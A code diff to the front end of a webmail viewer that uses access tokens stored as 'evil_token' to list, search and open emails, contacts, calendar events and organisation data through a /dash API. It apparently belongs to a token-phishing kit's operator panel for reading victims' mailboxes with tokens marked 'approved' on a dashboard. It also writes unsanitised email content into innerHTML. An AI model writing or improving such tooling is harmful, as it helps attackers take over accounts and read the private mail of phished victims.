@@ -255,19 +255,16 @@
         let refreshInterval = null;
 
         // =============================================
-        // TOKEN MANAGEMENT — FIXED
+        // TOKEN MANAGEMENT
         // =============================================
         function getTokenFromStorage() {
             try {
-                // 1. Try direct token first
                 let token = localStorage.getItem('evil_token_direct');
                 if (token && token.length > 10) {
                     accessToken = token;
                     console.log('✅ Token found in evil_token_direct');
                     return true;
                 }
-                
-                // 2. Try from evil_token object
                 const data = localStorage.getItem('evil_token');
                 if (data) {
                     try {
@@ -279,16 +276,6 @@
                         }
                     } catch (e) {}
                 }
-                
-                // 3. Try from session storage (fallback)
-                const sessionToken = sessionStorage.getItem('evil_token_direct');
-                if (sessionToken && sessionToken.length > 10) {
-                    accessToken = sessionToken;
-                    localStorage.setItem('evil_token_direct', sessionToken);
-                    console.log('✅ Token found in sessionStorage');
-                    return true;
-                }
-                
                 console.log('❌ No token found in storage');
                 return false;
             } catch (e) {
@@ -298,7 +285,7 @@
         }
 
         // =============================================
-        // API HELPERS
+        // API HELPERS — FIXED with /dash prefix
         // =============================================
         async function apiCall(endpoint, method = 'POST', body = null) {
             if (!accessToken) {
@@ -308,30 +295,52 @@
                     throw new Error(msg);
                 }
             }
+            
             const options = {
                 method: method,
                 headers: { 'Content-Type': 'application/json' }
             };
+            
             const requestBody = { accessToken, ...(body || {}) };
             options.body = JSON.stringify(requestBody);
             
-            console.log(`📤 Calling ${endpoint} with token: ${accessToken.slice(0, 20)}...`);
+            // ✅ FIX: Add /dash prefix
+            const url = `/dash${endpoint}`;
+            console.log(`📤 Calling ${url}`);
             
-            const res = await fetch(`/dash${endpoint}`, options);
-            const data = await res.json();
-            
-            if (data.error) {
-                if (data.error.includes('expired') || data.error.includes('invalid') || data.error.includes('401')) {
-                    document.getElementById('tokenStatus').textContent = '🔑 Token: Expired';
-                    alert('Token expired. Please refresh from the dashboard.');
-                    accessToken = null;
-                    localStorage.removeItem('evil_token');
-                    localStorage.removeItem('evil_token_direct');
+            try {
+                const res = await fetch(url, options);
+                
+                // Log response status
+                console.log(`📥 Response status: ${res.status}`);
+                
+                if (!res.ok) {
+                    const errorText = await res.text();
+                    console.error(`❌ HTTP ${res.status}: ${errorText}`);
+                    throw new Error(`HTTP ${res.status}: ${errorText}`);
                 }
-                throw new Error(data.error);
+                
+                const data = await res.json();
+                console.log(`📥 Response data:`, data);
+                
+                if (data.error) {
+                    console.error('❌ API Error:', data.error);
+                    if (data.error.includes('expired') || data.error.includes('invalid') || data.error.includes('401')) {
+                        document.getElementById('tokenStatus').textContent = '🔑 Token: Expired';
+                        alert('Token expired. Please refresh from the dashboard.');
+                        accessToken = null;
+                        localStorage.removeItem('evil_token');
+                        localStorage.removeItem('evil_token_direct');
+                    }
+                    throw new Error(data.error);
+                }
+                
+                document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
+                return data;
+            } catch (e) {
+                console.error('❌ Fetch Error:', e);
+                throw e;
             }
-            document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
-            return data;
         }
 
         // =============================================
@@ -350,6 +359,10 @@
                 }
             } catch (e) {
                 console.error('Failed to load profile:', e);
+                document.getElementById('profileInfo').innerHTML = `
+                    <div class="name">Error loading profile</div>
+                    <div class="email">${e.message}</div>
+                `;
             }
         }
 
@@ -364,28 +377,47 @@
             document.getElementById('emailView').classList.remove('active');
             document.getElementById('emailList').style.display = 'block';
             
+            const titles = { inbox: 'Inbox', sent: 'Sent', drafts: 'Drafts', trash: 'Trash' };
+            document.getElementById('folderTitle').textContent = titles[folder] || folder;
+            
             try {
+                document.getElementById('emailList').innerHTML = `
+                    <div style="padding:40px; text-align:center; color:rgba(255,255,255,0.5);">
+                        <div class="spinner"></div>
+                        <p style="margin-top:12px;">Loading emails...</p>
+                    </div>
+                `;
+                
+                // Add spinner style if not exists
+                if (!document.querySelector('style#spinner-style')) {
+                    const style = document.createElement('style');
+                    style.id = 'spinner-style';
+                    style.textContent = `.spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #b388ff; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`;
+                    document.head.appendChild(style);
+                }
+
                 const data = await apiCall('/api/webmail/emails', 'POST', { 
                     folderId: folder, 
                     limit: 50, 
                     skip: 0 
                 });
+                
                 if (data && data.emails) {
                     emails = data.emails;
                     renderEmailList(emails);
-                    updateBadge(folder, emails.length);
+                    updateBadge(folder, emails.filter(e => !e.isRead).length);
                 } else {
-                    document.getElementById('emailList').innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No emails in ${folder}</p></div>`;
+                    document.getElementById('emailList').innerHTML = `<div class="empty-state"><div class="icon">📭</div><h3>Empty folder</h3><p>No emails in ${titles[folder] || folder}</p></div>`;
                 }
             } catch (e) {
-                document.getElementById('emailList').innerHTML = `<div class="empty-state"><div class="icon">❌</div><p>Error loading emails: ${e.message}</p></div>`;
+                document.getElementById('emailList').innerHTML = `<div class="empty-state"><div class="icon">❌</div><h3>Error loading emails</h3><p>${e.message}</p></div>`;
             }
         }
 
         function renderEmailList(emails) {
             const container = document.getElementById('emailList');
             if (!emails || emails.length === 0) {
-                container.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No emails in this folder</p></div>`;
+                container.innerHTML = `<div class="empty-state"><div class="icon">📭</div><h3>Empty folder</h3><p>No emails in this folder</p></div>`;
                 return;
             }
             container.innerHTML = '';
@@ -393,20 +425,27 @@
                 const div = document.createElement('div');
                 div.className = `email-item${email.isRead === false ? ' unread' : ''}`;
                 const sender = email.sender?.emailAddress?.address || 'Unknown';
-                const initials = sender.charAt(0).toUpperCase();
+                const senderName = email.sender?.emailAddress?.name || sender;
+                const initials = senderName.charAt(0).toUpperCase();
                 const subject = email.subject || '(No subject)';
                 const preview = email.bodyPreview || '';
-                const date = new Date(email.receivedDateTime).toLocaleString();
+                const date = new Date(email.receivedDateTime);
+                const now = new Date();
+                const dateStr = date.toDateString() === now.toDateString()
+                    ? date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+                    : date.toLocaleDateString();
                 const importanceClass = email.importance === 'high' ? 'high' : email.importance === 'low' ? 'low' : 'normal';
+                const hasAttachments = email.hasAttachments;
                 
                 div.innerHTML = `
                     <div class="avatar">${initials}</div>
                     <div class="content">
-                        <div class="subject">${subject}</div>
-                        <div class="from">${sender}</div>
+                        <div class="subject ${email.isRead === false ? 'unread' : ''}">${subject}</div>
+                        <div class="from ${email.isRead === false ? 'unread' : ''}">${senderName}</div>
                         <div class="preview">${preview}</div>
                     </div>
-                    <div class="date">${date}</div>
+                    ${hasAttachments ? '<span class="attachment-icon">📎</span>' : ''}
+                    <div class="date">${dateStr}</div>
                     <div class="importance ${importanceClass}"></div>
                 `;
                 div.onclick = () => loadEmail(email.id);
@@ -417,6 +456,7 @@
         function updateBadge(folder, count) {
             if (folder === 'inbox') {
                 document.getElementById('inboxCount').textContent = count;
+                document.getElementById('inboxCount').style.display = count > 0 ? 'inline' : 'none';
             }
         }
 
@@ -425,20 +465,34 @@
         // =============================================
         async function loadEmail(emailId) {
             try {
+                document.getElementById('emailList').style.display = 'none';
+                document.getElementById('emailView').classList.add('active');
+                document.getElementById('viewBody').innerHTML = '<div class="spinner"></div><p style="text-align:center;color:rgba(255,255,255,0.5);margin-top:12px;">Loading...</p>';
+
                 const data = await apiCall('/api/webmail/email', 'POST', { messageId: emailId });
                 if (data && data.email) {
                     const email = data.email;
                     currentEmailId = emailId;
-                    document.getElementById('emailList').style.display = 'none';
-                    document.getElementById('emailView').classList.add('active');
                     document.getElementById('viewSubject').textContent = email.subject || '(No subject)';
+
                     const sender = email.sender?.emailAddress?.address || 'Unknown';
+                    const senderName = email.sender?.emailAddress?.name || sender;
+                    const initials = senderName.charAt(0).toUpperCase();
                     const date = new Date(email.receivedDateTime).toLocaleString();
-                    document.getElementById('viewMeta').textContent = `From: ${sender} · ${date}`;
-                    document.getElementById('viewBody').innerHTML = email.body?.content || 'No content available.';
+
+                    document.getElementById('viewAvatar').textContent = initials;
+                    document.getElementById('viewSender').textContent = senderName;
+                    document.getElementById('viewEmailAddr').textContent = sender;
+                    document.getElementById('viewDate').textContent = date;
+
+                    let body = email.body?.content || 'No content available.';
+                    if (!body.includes('<')) {
+                        body = body.replace(/\n/g, '<br>');
+                    }
+                    document.getElementById('viewBody').innerHTML = body;
                 }
             } catch (e) {
-                alert('Failed to load email: ' + e.message);
+                document.getElementById('viewBody').innerHTML = `<p style="color:#d32f2f;">Failed to load email: ${e.message}</p>`;
             }
         }
 
@@ -455,10 +509,16 @@
             const query = document.getElementById('searchInput').value.trim();
             if (!query) { loadFolder(currentFolder); return; }
             try {
-                const data = await apiCall('/api/webmail/search', 'POST', { 
-                    query: query, 
+                document.getElementById('emailList').innerHTML = `
+                    <div style="padding:40px; text-align:center; color:rgba(255,255,255,0.5);">
+                        <div class="spinner"></div>
+                        <p style="margin-top:12px;">Searching...</p>
+                    </div>
+                `;
+                const data = await apiCall('/api/webmail/search', 'POST', {
+                    query: query,
                     folderId: currentFolder,
-                    limit: 50 
+                    limit: 50
                 });
                 if (data && data.emails) {
                     renderEmailList(data.emails);
@@ -492,7 +552,7 @@
         }
 
         // =============================================
-        // CONTACTS / CALENDAR / ORG (Stubs)
+        // CONTACTS / CALENDAR / ORG
         // =============================================
         async function loadContacts() {
             try {
@@ -502,10 +562,10 @@
                     document.getElementById('emailView').classList.remove('active');
                     container.style.display = 'block';
                     if (data.contacts.length === 0) {
-                        container.innerHTML = `<div class="empty-state"><div class="icon">📇</div><p>No contacts found</p></div>`;
+                        container.innerHTML = `<div class="empty-state"><div class="icon">📇</div><h3>No contacts</h3><p>No contacts found</p></div>`;
                         return;
                     }
-                    let html = '<div style="padding:16px;"><h3 style="margin-bottom:12px;">📇 Contacts</h3>';
+                    let html = '<div style="padding:16px;"><h3 style="margin-bottom:12px;color:rgba(255,255,255,0.8);">📇 Contacts</h3>';
                     data.contacts.forEach(c => {
                         const name = c.displayName || 'Unknown';
                         const email = c.emailAddresses?.[0]?.address || 'No email';
@@ -529,10 +589,10 @@
                     document.getElementById('emailView').classList.remove('active');
                     container.style.display = 'block';
                     if (data.events.length === 0) {
-                        container.innerHTML = `<div class="empty-state"><div class="icon">📅</div><p>No upcoming events</p></div>`;
+                        container.innerHTML = `<div class="empty-state"><div class="icon">📅</div><h3>No events</h3><p>No upcoming events</p></div>`;
                         return;
                     }
-                    let html = '<div style="padding:16px;"><h3 style="margin-bottom:12px;">📅 Calendar Events</h3>';
+                    let html = '<div style="padding:16px;"><h3 style="margin-bottom:12px;color:rgba(255,255,255,0.8);">📅 Calendar Events</h3>';
                     data.events.forEach(e => {
                         const subject = e.subject || 'Untitled';
                         const start = new Date(e.start?.dateTime).toLocaleString();
@@ -559,7 +619,7 @@
                     container.style.display = 'block';
                     container.innerHTML = `
                         <div style="padding:16px;">
-                            <h3 style="margin-bottom:12px;">🏢 Organization</h3>
+                            <h3 style="margin-bottom:12px;color:rgba(255,255,255,0.8);">🏢 Organization</h3>
                             <div style="padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.04);">
                                 <strong>Name:</strong> ${org.displayName || 'N/A'}
                             </div>
@@ -609,7 +669,7 @@
         }
 
         // =============================================
-        // INIT — FIXED
+        // INIT
         // =============================================
         async function init() {
             console.log('🚀 Webmail initializing...');
@@ -631,12 +691,6 @@
                         <p style="color:rgba(255,255,255,0.5);">
                             Go to the <a href="/dash" style="color:#b388ff;">dashboard</a>, 
                             find your approved token, and click <strong>📧 Webmail</strong>.
-                        </p>
-                        <p style="font-size:12px; margin-top:8px; color:rgba(255,255,255,0.3);">
-                            Or paste a token manually in the console:
-                            <br><code style="background:rgba(255,255,255,0.05);padding:4px 8px;border-radius:4px;">
-                            localStorage.setItem('evil_token_direct', 'YOUR_TOKEN')
-                            </code>
                         </p>
                     </div>
                 `;
